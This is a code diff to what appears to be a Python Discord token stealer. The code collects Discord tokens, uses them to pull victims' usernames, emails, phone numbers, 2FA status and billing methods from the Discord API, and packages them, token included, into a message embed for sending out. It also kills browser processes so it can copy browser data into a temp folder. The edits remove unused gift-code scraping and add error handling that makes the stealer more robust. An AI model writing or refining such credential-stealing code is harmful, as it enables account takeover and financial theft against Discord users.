@@ -44,7 +44,7 @@ __CONFIG__ = {
 #global variables
 temp = os.getenv("temp")
 temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
-mk_temp = os.mkdir(temp_path)
+os.mkdir(temp_path)
 localappdata = os.getenv("localappdata")
 
 
@@ -429,7 +429,6 @@ class Discord:
             if token in self.tokens_sent:
                 pass
 
-            val_codes = []
             val = ""
             nitro = ""
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
@@ -437,7 +436,6 @@ class Discord:
                        'Authorization': token}
             user = requests.get(self.baseurl, headers=headers).json()
             payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
-            gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
             username = user['username'] + '#' + user['discriminator']
             discord_id = user['id']
             avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" if requests.get(
@@ -470,24 +468,6 @@ class Discord:
                         methods += "❓"
 
             val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔐 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'
-
-            #if "code" in gift.text:
-            #    codes = json.loads(gift.text)
-            #    for code in codes:
-            #        val_codes.append((code['code'], code['promotion']['outbound_title']))
-#
-            #if not val_codes:
-            #    val += "\n:gift: **No Gift Cards Found**\n"
-            #elif len(val_codes) >= 3:
-            #    num = 0
-            #    for c, t in val_codes:
-            #        num += 1
-            #        if num == 3:
-            #            break
-            #        val += f'\n:gift: **{t}:**\n`{c}`\n'
-            #else:
-            #    for c, t in val_codes:
-            #        val += f'\n:gift: **{t}:**\n`{c}`\n'
 
             data = {
                 "embeds": [
@@ -588,7 +568,10 @@ class Browsers:
                 self.browsers_found.append(proc)
 
         for proc in self.browsers_found:
-            proc.kill()
+            try:
+                proc.kill()
+            except Exception:
+                pass
 
         os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)
 
